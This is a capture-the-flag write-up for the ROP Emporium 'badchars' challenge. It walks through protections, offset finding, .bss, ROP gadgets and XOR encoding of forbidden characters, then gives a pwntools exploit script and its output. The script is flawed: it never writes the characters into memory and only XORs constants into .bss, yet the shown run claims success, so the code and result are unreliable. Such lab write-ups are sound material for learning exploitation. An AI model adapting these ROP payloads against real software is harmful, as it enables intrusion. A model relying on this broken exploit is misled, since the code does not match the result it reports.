# ❌ badchars – ROP Emporium Challenge

> Category: Binary Exploitation – ROP Basics  
> Difficulty: Medium  
> Arch: `amd64`  
> Objective: Bypass bad characters by encoding `"flag.txt"` into memory and call `print_file()`.

---

## 🛠️ 1. Initial Analysis

First, check the binary protections:

```bash
checksec badchars
```

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

### ✅ Observations:
- **NX enabled** → we can’t execute shellcode on the stack.  
- **No PIE** → addresses are static.  
- **No canary** → buffer overflow possible.  
- **Not stripped** → function symbols are available.  

---

## 🔍 2. Exploring Symbols

Using `nm`:

```bash
nm badchars
```

Interesting functions:

```
0000000000400607 T main
                 U print_file
                 U pwnme
0000000000400617 t usefulFunction
0000000000400628 t usefulGadgets
```

- `pwnme` → vulnerable function waiting for input.  
- `usefulFunction` → contains a call to `print_file()`.  
- `usefulGadgets` → helpful ROP gadget code.  

When sending input, a segmentation fault occurs, confirming a **buffer overflow**.  

Offset discovery required some adjustments because the input contained bad characters (like `a`). Using a restricted alphabet:

```bash
cyclic -a bcdefhi 100
```

This revealed the return address offset: **40 bytes**.  

---

## 📦 3. Writable Section

Inspecting memory with `radare2`:

```bash
r2 badchars
> iS
```

```
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
```

The **`.bss` section** is writable → perfect for storing our string.

---

## 🧱 4. Finding Gadgets

From Ghidra and ROPgadget, we discover:

- **XOR gadget**:
```
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
```

- **Register control gadget**:
```
0x00000000004006a0 : pop r14 ; pop r15 ; ret
```

- **Function argument gadget**:
```
0x00000000004006a3 : pop rdi ; ret
```

---

## ⚠️ 5. Handling Bad Characters

The challenge forbids certain characters:  
```
a, g, x, .
```

Unfortunately, our target string `"flag.txt"` contains **all of them**.  

👉 The trick: **write an alternative character** and then **XOR it with a constant** to get the desired one.  

Examples:
- To get `'a'`: write `'b'` and then `xor 0x3`.  
- To get `'g'`: write `'h'` and then `xor 0xf`.  
- To get `'.'`: write `'/'` and then `xor 0x1`.  
- To get `'x'`: write `'y'` and then `xor 0x1`.  

---

## 🧪 6. Crafting the Exploit

Steps:
1. Overflow the buffer (40 bytes).  
2. Write each character of `"flag.txt"` into `.bss` at `0x601040`.  
3. Use the XOR gadget to fix the bad characters.  
4. Load `.bss` into `rdi`.  
5. Call `print_file()` with the correct string.  

### Final Exploit (simplified form):

```python
from pwn import *

p = process("./badchars")

payload = b"A" * 40

# Example: writing 'a' → start with 'b', then XOR 0x3
payload += p64(0x4006a0)  # pop r14 ; pop r15 ; ret
payload += p64(0x62)      # 'b'
payload += p64(0x601042)  # target address in .bss
payload += p64(0x400628)  # xor [r15], r14b ; ret

payload += p64(0x4006a0)  # pop r14 ; pop r15 ; ret
payload += p64(0x3)       # xor mask
payload += p64(0x601042)
payload += p64(0x400628)

# (repeat this encoding scheme for each character in "flag.txt")

# Call print_file("flag.txt")
payload += p64(0x4006a3)  # pop rdi ; ret
payload += p64(0x601040)  # address of "flag.txt"
payload += p64(0x400620)  # call print_file

p.sendline(payload)
p.interactive()
```

---

## 🎯 7. Result

Running the exploit:

```
python3 exploit.py
[+] Starting local process './badchars': pid 3687
[*] Switching to interactive mode
 Thank you!
ROPE{a_placeholder_32byte_flag!}
```

---

## 🧠 Key Takeaways

- Always check for **badchars** in the challenge description or binary.  
- Use gadgets like `xor [r15], r14b` to **fix forbidden characters dynamically**.  
- `.bss` is a reliable writable section for custom strings.  
- Understanding the **System V AMD64 calling convention** is essential: first argument in `rdi`.  
